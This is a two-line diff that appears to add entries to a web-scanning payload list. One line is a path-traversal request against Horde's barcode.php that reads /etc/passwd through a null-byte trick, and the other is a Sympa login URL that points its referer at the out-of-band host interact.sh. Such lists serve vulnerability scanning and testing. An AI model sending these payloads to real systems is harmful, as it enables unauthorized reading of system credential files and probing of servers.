@@ -1,0 +1,2 @@
+/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
+/sympa?referer=http://interact.sh&passwd=&previous_action=&action=login&action_login=&previous_list=&list=&email=
